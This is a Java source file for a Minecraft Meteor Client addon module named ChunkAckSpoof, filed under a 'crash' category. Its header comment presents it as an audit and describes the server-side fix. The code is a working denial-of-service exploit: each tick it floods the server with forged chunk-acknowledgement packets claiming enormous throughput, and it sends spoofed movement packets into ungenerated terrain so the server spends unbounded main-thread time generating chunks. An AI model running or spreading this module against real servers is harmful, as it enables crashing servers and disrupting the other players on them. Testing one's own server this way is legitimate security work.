package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.AcknowledgeChunksC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/**
 * AUDIT: Chunk-Acknowledgement Spoof (chunk-send throttle bypass)
 *
 * Modern Minecraft throttles how fast it streams chunks to a client: the client
 * reports, via AcknowledgeChunksC2SPacket, how many chunks per tick it has
 * actually processed, and the server uses that as a flow-control credit. This
 * module spoofs a dishonest, enormous desired-chunks-per-tick value so the
 * server believes the client can absorb chunks far faster than reality — and
 * dumps them as fast as it can generate/serialize them.
 *
 * Paired with movement into ungenerated terrain, this is the real form of
 * "chunk request manipulation": the attacker never sends an explicit chunk
 * request (there is no such packet), but defeats the credit system that exists
 * specifically to stop a client from overwhelming the chunk pipeline.
 *
 * What a vulnerable server does: trusts the client's claimed throughput and
 * removes its own send cap, spending unbounded main-thread time on chunk
 * serialization.
 * What a hardened server does: clamps the acknowledged value to a sane server
 * maximum and keeps an independent server-side chunk-send budget.
 * Fix: treat the client's desiredChunksPerTick as an upper hint only; clamp it,
 * and never let it raise the send rate above the server's own configured cap.
 *
 * Enable; pair with extreme-velocity / chunk-border-stress to actually request
 * new terrain. Run against your OWN local server only.
 */
public class ChunkAckSpoof extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Double> desiredChunks = sgGeneral.add(new DoubleSetting.Builder()
        .name("desired-chunks-per-tick").description("Spoofed chunk-throughput credit reported to the server.")
        .defaultValue(10000.0).range(1.0, 1_000_000.0).sliderRange(100.0, 100_000.0).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("acks-per-tick").description("Acknowledgement packets per tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 200).build()
    );
    private final Setting<Boolean> wander = sgGeneral.add(new BoolSetting.Builder()
        .name("wander").description("Drift position outward each tick to keep requesting fresh chunks.")
        .defaultValue(true).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private double drift = 0;

    public ChunkAckSpoof() {
        super(AddonTemplate.CRASH_CATEGORY, "chunk-ack-spoof",
            "Reports a dishonest huge chunk-throughput credit. Tests the chunk-send flow-control clamp.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; drift = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        float credit = (float) (double) desiredChunks.get();
        for (int i = 0; i < perTick.get(); i++) {
            mc.player.networkHandler.sendPacket(new AcknowledgeChunksC2SPacket(credit));
            packetsSent++;
        }
        if (wander.get()) {
            drift += 16.0;
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                mc.player.getX() + drift, mc.player.getY(), mc.player.getZ(), true, false));
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
